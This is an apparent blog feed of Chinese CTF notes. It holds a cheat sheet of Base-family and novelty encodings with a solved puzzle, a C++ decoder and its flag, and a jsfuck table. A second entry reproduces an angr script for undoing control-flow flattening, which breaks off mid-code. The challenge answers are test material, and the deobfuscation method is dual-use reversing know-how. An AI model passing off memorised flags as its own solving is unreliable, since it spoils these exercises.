        <content type="html"><![CDATA[<ul><li>Some common encryption<span id="more"></span></li></ul><HR color="red"></HR><h2 id="Base家族"><a href="#Base家族" class="headerlink" title="Base家族"></a>Base家族</h2><h4 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h4><ul><li>16进制，只包含（[0-9], [A-F]）</li></ul><h4 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h4><ul><li>（[A-Z],[2-7]）,一般来讲密文字母多于数字，而且末尾有多个等号</li></ul><h4 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h4><ul><li>结尾无等号</li></ul><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><ul><li>（[A-Z],[a-z],[0-9]），末尾有1到2个等号</li><li>8位变6位重组</li></ul><h4 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h4><ul><li>等号可能出现在密文中间</li></ul><h4 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h4><ul><li>（[0-9]，[a-z]，[A-Z],[!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~”]）</li></ul><h4 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h4><ul><li>密文为emjio</li></ul><h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><h3 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h3><ul><li>由于每一个数都可以变成形式为”2a+2b+2c….”的表达式<br>所以我们用对应”abc…”数字串来代表这个数</li><li>例如<br>5 &#x3D; 20+22，即可表示为02<br>19 &#x3D; 20+21+24，即014</li></ul><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>8842101220480224404014224202480122</p></blockquote><ul><li>是8位大写字母</li><li>采用幂数加密</li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><ul><li><p>联想8位字母和8个0的字符串，猜测以0为分隔符<br>拆分后可以得到：</p><blockquote><p>88421 122 48 2244 4 142242 248 122</p></blockquote></li><li><p>观察发现每个数字都是2的倍数，推断单个数字表示的就是”2a“，所以将每一段数字直接求和</p></li><li><p>上脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">string s = &quot;88421 122 48 2244 4 142242 248 122 &quot;; </span><br><span class="line">int sum = 0;</span><br><span class="line">for(int i = 0; i &lt; s.length(); i++)&#123;</span><br><span class="line">if(s[i] == &#x27; &#x27;)&#123;</span><br><span class="line">cout &lt;&lt;char(sum+&#x27;A&#x27;-1);</span><br><span class="line">sum = 0;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">sum += (s[i]-&#x27;0&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>得到flag：</p><blockquote><p>cyberpace{WELLDONE}</p></blockquote></li></ul><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><ul><li><p>特征：</p><p><img src="https://s2.loli.net/2022/11/10/NcQI8HopdEwVzy9.jpg" alt="Crypto_Pig.jpg"></p></li><li><p>解密网站：</p><ul><li><a href="https://xiao84.com/tools/103177.html">猪圈密码-在线解密加密工具 (xiao84.com)</a></li></ul></li></ul><h2 id="emjio-AES"><a href="#emjio-AES" class="headerlink" title="emjio-AES"></a>emjio-AES</h2><ul><li>加密过程就是将一段字符串用key和rotation进行AES加密，然后将输出的base64码用表情包替换，特征只能靠猜和hint了</li><li>解密网站：<ul><li><a href="https://aghorler.github.io/emoji-aes/">emoji-aes (aghorler.github.io)</a></li></ul></li><li>涉及题目<ul><li>ISCTF2022 可爱的emjio</li></ul></li></ul><h2 id="佛曰加密"><a href="#佛曰加密" class="headerlink" title="佛曰加密"></a>佛曰加密</h2><ul><li>特征：“諸隸毘僧降毘吽諸陀毘摩毘隸僧毘缽薩毘願心毘婆毘嚴彌毘念毘如毘囑毘” 一堆古怪文字</li><li>解密网站：<ul><li><a href="http://hi.pcmoe.net/Buddha.html">新约佛论禅&#x2F;佛曰加密 - PcMoe!</a></li></ul></li></ul><h2 id="天干地支加密"><a href="#天干地支加密" class="headerlink" title="天干地支加密"></a>天干地支加密</h2><ul><li>特征：利用纪年法对应加密数字</li><li>解密：查表</li><li>涉及题目：<ul><li>[MRCTF]天干地支+甲子</li></ul></li></ul><h2 id="社会主义核心价值观加密"><a href="#社会主义核心价值观加密" class="headerlink" title="社会主义核心价值观加密"></a>社会主义核心价值观加密</h2><ul><li>特征：顾名思义</li><li>解密网站：<ul><li><a href="http://www.atoolbox.net/Tool.php?Id=850">社会主义核心价值观加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></li></ul></li></ul><h2 id="jsfuck编码"><a href="#jsfuck编码" class="headerlink" title="jsfuck编码"></a>jsfuck编码</h2><ul><li><p>特征：由()+ []! 六个字符组成编码</p></li><li><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">false==&gt;![]</span><br><span class="line">true=&gt;!![]</span><br><span class="line">undefined=&gt;[][[]]</span><br><span class="line">NaN=&gt;+[![]]</span><br><span class="line">0=&gt;+[]</span><br><span class="line">1=&gt;+!+[]</span><br><span class="line">2=&gt;!+[]+!+[]</span><br><span class="line">10=&gt;[+!+[]]+[+[]]</span><br><span class="line">Array=&gt;[]</span><br><span class="line">Number=&gt;+[]</span><br><span class="line">String=&gt;[]+[]</span><br><span class="line">Boolean=&gt;![]</span><br><span class="line">Function=&gt;[][&quot;filter&quot;]</span><br><span class="line">eval=&gt;[][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window=&gt;[][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure></li><li><p>解密网站：</p><ul><li><a href="https://www.bugku.com/tools/jsfuck">https://www.bugku.com/tools/jsfuck</a></li><li><a href="https://www.dejs.vip/encry_decry/jsfuck.html">jsfuck加密&#x2F;解密 - dejs.vip</a></li></ul></li><li><p>涉及题目：</p><ul><li>buuctf - 这是什么</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deplanarization problem</title>
      <link href="/2023/03/31/Flat/"/>
      <url>/2023/03/31/Flat/</url>
      
        <content type="html"><![CDATA[<ul><li>Deplanarization problem<span id="more"></span></li></ul><HR color="red"></HR><h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><ol><li>查壳IDA</li><li>脚本去平坦化</li><li>IDA脚本去混淆</li><li>CRC32识别</li><li>解密脚本</li></ol><h2 id="脚本集"><a href="#脚本集" class="headerlink" title="脚本集"></a>脚本集</h2><ul><li><p>去平坦化脚本</p><ul><li><p>命令：</p><blockquote><p>python deflat.py attachment 0x400620</p></blockquote></li><li><p>deflat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> pyvex</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;C:\\Users\\du\\Desktop\\CTFTools\\Flat\\am_graph&#x27;</span>)  <span class="comment">## am_graph路径</span></span><br><span class="line"><span class="keyword">import</span> am_graph</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr.state_plugins.symbolic_memory&#x27;</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="comment"># logging.getLogger(&#x27;angr.sim_manager&#x27;).setLevel(logging.DEBUG)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_relevant_nop_nodes</span>(<span class="params">supergraph</span>):</span><br><span class="line">    <span class="keyword">global</span> pre_dispatcher_node, prologue_node, retn_node</span><br><span class="line">    <span class="comment"># relevant_nodes = list(supergraph.predecessors(pre_dispatcher_node))</span></span><br><span class="line">    relevant_nodes = []</span><br><span class="line">    nop_nodes = []</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> supergraph.nodes():</span><br><span class="line">        <span class="keyword">if</span> supergraph.has_edge(node, pre_dispatcher_node) <span class="keyword">and</span> node.size &gt; <span class="number">8</span>:</span><br><span class="line">            <span class="comment"># <span class="doctag">XXX:</span> use node.size is faster than to create a block </span></span><br><span class="line">            relevant_nodes.append(node)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> node.addr <span class="keyword">in</span> ( prologue_node.addr, retn_node.addr, pre_dispatcher_node.addr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nop_nodes.append(node)</span><br><span class="line">    <span class="keyword">return</span> relevant_nodes, nop_nodes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">symbolic_execution</span>(<span class="params">start_addr, hook_addr=<span class="literal">None</span>, modify=<span class="literal">None</span>, inspect=<span class="literal">False</span></span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">retn_procedure</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> project</span><br><span class="line">        ip = state.se.<span class="built_in">eval</span>(state.regs.ip)</span><br><span class="line">        project.unhook(ip)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">statement_inspect</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> modify_value</span><br><span class="line">        expressions = <span class="built_in">list</span>(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(expressions) != <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">            state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = modify_value</span><br><span class="line">            state.inspect._breakpoints[<span class="string">&#x27;statement&#x27;</span>] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> project, relevant_block_addrs, modify_value</span><br><span class="line">    <span class="keyword">if</span> hook_addr != <span class="literal">None</span>:</span><br><span class="line">        project.hook(hook_addr, retn_procedure, length=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> modify != <span class="literal">None</span>:</span><br><span class="line">        modify_value = modify</span><br><span class="line">    state = project.factory.blank_state(addr=start_addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">    <span class="keyword">if</span> inspect:</span><br><span class="line">        state.inspect.b(<span class="string">&#x27;statement&#x27;</span>, when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect)</span><br><span class="line">    sm = project.factory.simulation_manager(state)</span><br><span class="line">    sm.step()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(sm.active) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> active_state <span class="keyword">in</span> sm.active:</span><br><span class="line">            <span class="keyword">if</span> active_state.addr <span class="keyword">in</span> relevant_block_addrs:</span><br><span class="line">                <span class="keyword">return</span> active_state.addr</span><br><span class="line">        sm.step()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_nop</span>(<span class="params">data, start_addr, length</span>):</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        data[start_addr + i] = <span class="built_in">ord</span>(opcode[<span class="string">&#x27;nop&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_jmp_offset</span>(<span class="params">data, start, offset</span>):</span><br><span class="line">    jmp_offset = struct.pack(<span class="string">&#x27;&lt;i&#x27;</span>, offset)  <span class="comment"># bytes</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        data[start + i] = jmp_offset[i]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_byte</span>(<span class="params">data, offset, value</span>):</span><br><span class="line">    <span class="comment"># operate on bytearray, not str</span></span><br><span class="line">    data[offset] = <span class="built_in">ord</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python deflat.py filename function_address(hex)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    opcode = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;\x87&#x27;</span>, <span class="string">&#x27;ae&#x27;</span>: <span class="string">&#x27;\x83&#x27;</span>, <span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;\x82&#x27;</span>, <span class="string">&#x27;be&#x27;</span>:<span class="string">&#x27;\x86&#x27;</span>, <span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;\x82&#x27;</span>, <span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;\x84&#x27;</span>, <span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;\x84&#x27;</span>, <span class="string">&#x27;g&#x27;</span>:<span class="string">&#x27;\x8F&#x27;</span>, </span><br><span class="line">              <span class="string">&#x27;ge&#x27;</span>:<span class="string">&#x27;\x8D&#x27;</span>, <span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;\x8C&#x27;</span>, <span class="string">&#x27;le&#x27;</span>:<span class="string">&#x27;\x8E&#x27;</span>, <span class="string">&#x27;na&#x27;</span>:<span class="string">&#x27;\x86&#x27;</span>, <span class="string">&#x27;nae&#x27;</span>:<span class="string">&#x27;\x82&#x27;</span>, <span class="string">&#x27;nb&#x27;</span>:<span class="string">&#x27;\x83&#x27;</span>, <span class="string">&#x27;nbe&#x27;</span>:<span class="string">&#x27;\x87&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>:<span class="string">&#x27;\x83&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;ne&#x27;</span>:<span class="string">&#x27;\x85&#x27;</span>, <span class="string">&#x27;ng&#x27;</span>:<span class="string">&#x27;\x8E&#x27;</span>, <span class="string">&#x27;nge&#x27;</span>:<span class="string">&#x27;\x8C&#x27;</span>, <span class="string">&#x27;nl&#x27;</span>:<span class="string">&#x27;\x8D&#x27;</span>, <span class="string">&#x27;nle&#x27;</span>:<span class="string">&#x27;\x8F&#x27;</span>, <span class="string">&#x27;no&#x27;</span>:<span class="string">&#x27;\x81&#x27;</span>, <span class="string">&#x27;np&#x27;</span>:<span class="string">&#x27;\x8B&#x27;</span>, <span class="string">&#x27;ns&#x27;</span>:<span class="string">&#x27;\x89&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;nz&#x27;</span>:<span class="string">&#x27;\x85&#x27;</span>, <span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;\x80&#x27;</span>, <span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;\x8A&#x27;</span>, <span class="string">&#x27;pe&#x27;</span>:<span class="string">&#x27;\x8A&#x27;</span>, <span class="string">&#x27;po&#x27;</span>:<span class="string">&#x27;\x8B&#x27;</span>, <span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;\x88&#x27;</span>, <span class="string">&#x27;nop&#x27;</span>:<span class="string">&#x27;\x90&#x27;</span>, <span class="string">&#x27;jmp&#x27;</span>:<span class="string">&#x27;\xE9&#x27;</span>, <span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;\x0F&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    start = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    project = angr.Project(filename, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    cfg = project.analyses.CFGFast(normalize=<span class="literal">True</span>)  <span class="comment"># do normalize to avoid overlapping blocks</span></span><br><span class="line">    target_function = cfg.functions.get(start)</span><br><span class="line">    <span class="comment"># A super transition graph is a graph that looks like IDA Pro&#x27;s CFG</span></span><br><span class="line">    supergraph = am_graph.to_supergraph(target_function.transition_graph)</span><br><span class="line"></span><br><span class="line">    base_addr = project.loader.main_object.mapped_base &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get prologue_node and retn_node</span></span><br><span class="line">    prologue_node = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> supergraph.nodes():</span><br><span class="line">        <span class="keyword">if</span> supergraph.in_degree(node) == <span class="number">0</span>:</span><br><span class="line">            prologue_node = node</span><br><span class="line">        <span class="keyword">if</span> supergraph.out_degree(node) == <span class="number">0</span>:</span><br><span class="line">            retn_node = node</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> prologue_node <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> prologue_node.addr != start:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Something must be wrong...&quot;</span>)</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    main_dispatcher_node = <span class="built_in">list</span>(supergraph.successors(prologue_node))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> supergraph.predecessors(main_dispatcher_node):</span><br><span class="line">        <span class="keyword">if</span> node.addr != prologue_node.addr:</span><br><span class="line">            pre_dispatcher_node = node</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    relevant_nodes, nop_nodes = get_relevant_nop_nodes(supergraph)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*******************relevant blocks************************&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;prologue: %#x&#x27;</span> % start)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_dispatcher: %#x&#x27;</span> % main_dispatcher_node.addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;pre_dispatcher: %#x&#x27;</span> % pre_dispatcher_node.addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;retn: %#x&#x27;</span> % retn_node.addr)</span><br><span class="line">    relevant_block_addrs = [node.addr <span class="keyword">for</span> node <span class="keyword">in</span> relevant_nodes]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;relevant_blocks:&#x27;</span>, [<span class="built_in">hex</span>(addr) <span class="keyword">for</span> addr <span class="keyword">in</span> relevant_block_addrs])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*******************symbolic execution*********************&#x27;</span>)</span><br><span class="line">    relevants = relevant_nodes</span><br><span class="line">    relevants.append(prologue_node)</span><br><span class="line">    relevants_without_retn = <span class="built_in">list</span>(relevants)</span><br><span class="line">    relevants.append(retn_node)</span><br><span class="line">    relevant_block_addrs.extend([prologue_node.addr, retn_node.addr])</span><br><span class="line"></span><br><span class="line">    flow = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">    modify_value = <span class="literal">None</span></span><br><span class="line">    patch_instrs = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> relevant <span class="keyword">in</span> relevants_without_retn:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-------------------dse %#x---------------------&#x27;</span> % relevant.addr)</span><br><span class="line">        block = project.factory.block(relevant.addr, size=relevant.size)</span><br><span class="line">        has_branches = <span class="literal">False</span></span><br><span class="line">        hook_addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> block.capstone.insns:</span><br><span class="line">            <span class="keyword">if</span> ins.insn.mnemonic.startswith(<span class="string">&#x27;cmov&#x27;</span>):</span><br><span class="line">                patch_instrs[relevant] = ins</span><br><span class="line">                has_branches = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> ins.insn.mnemonic.startswith(<span class="string">&#x27;call&#x27;</span>):</span><br><span class="line">                hook_addr = ins.insn.address</span><br><span class="line">        <span class="keyword">if</span> has_branches:</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant.addr, hook_addr, claripy.BVV(<span class="number">1</span>, <span class="number">1</span>), <span class="literal">True</span>))</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant.addr, hook_addr, claripy.BVV(<span class="number">0</span>, <span class="number">1</span>), <span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant.addr, hook_addr))</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;************************flow******************************&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> flow.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%#x: &#x27;</span> % k.addr, [<span class="built_in">hex</span>(child) <span class="keyword">for</span> child <span class="keyword">in</span> v])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print retn_node flow. Actually, it&#x27;s [].</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%#x: &#x27;</span> % retn_node.addr, [])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;************************patch*****************************&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> origin:</span><br><span class="line">        <span class="comment"># Attention: can&#x27;t transform to str by calling decode() directly. so use bytearray instead.</span></span><br><span class="line">        origin_data = <span class="built_in">bytearray</span>(origin.read())</span><br><span class="line">        origin_data_len = <span class="built_in">len</span>(origin_data)</span><br><span class="line"></span><br><span class="line">    recovery_file = filename + <span class="string">&#x27;_recovered&#x27;</span></span><br><span class="line">    recovery = <span class="built_in">open</span>(recovery_file, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch irrelevant blocks</span></span><br><span class="line">    <span class="keyword">for</span> nop_node <span class="keyword">in</span> nop_nodes:</span><br><span class="line">        fill_nop(origin_data, nop_node.addr - base_addr, nop_node.size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># remove unnecessary control flows</span></span><br><span class="line">    <span class="keyword">for</span> parent, childs <span class="keyword">in</span> flow.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(childs) == <span class="number">1</span>:</span><br><span class="line">            parent_block = project.factory.block(parent.addr, size=parent.size)</span><br><span class="line">            last_instr = parent_block.capstone.insns[-<span class="number">1</span>]</span><br><span class="line">            file_offset = last_instr.address - base_addr</span><br><span class="line">            <span class="comment"># patch the last jmp instruction</span></span><br><span class="line">            patch_byte(origin_data, file_offset, opcode[<span class="string">&#x27;jmp&#x27;</span>])</span><br><span class="line">            file_offset += <span class="number">1</span></span><br><span class="line">            fill_nop(origin_data, file_offset, last_instr.size - <span class="number">1</span>)</span><br><span class="line">            fill_jmp_offset(origin_data, file_offset, childs[<span class="number">0</span>] - last_instr.address - <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            instr = patch_instrs[parent]</span><br><span class="line">            file_offset = instr.address - base_addr</span><br><span class="line">            <span class="comment"># patch instructions starting from `cmovx` to the end of block</span></span><br><span class="line">            fill_nop(origin_data, file_offset, parent.addr + parent.size - base_addr - file_offset)</span><br><span class="line">            patch_byte(origin_data, file_offset, opcode[<span class="string">&#x27;j&#x27;</span>])</span><br><span class="line">            patch_byte(origin_data, file_offset + <span class="number">1</span>, opcode[instr.mnemonic[<span class="number">4</span>:]])</span><br><span class="line">            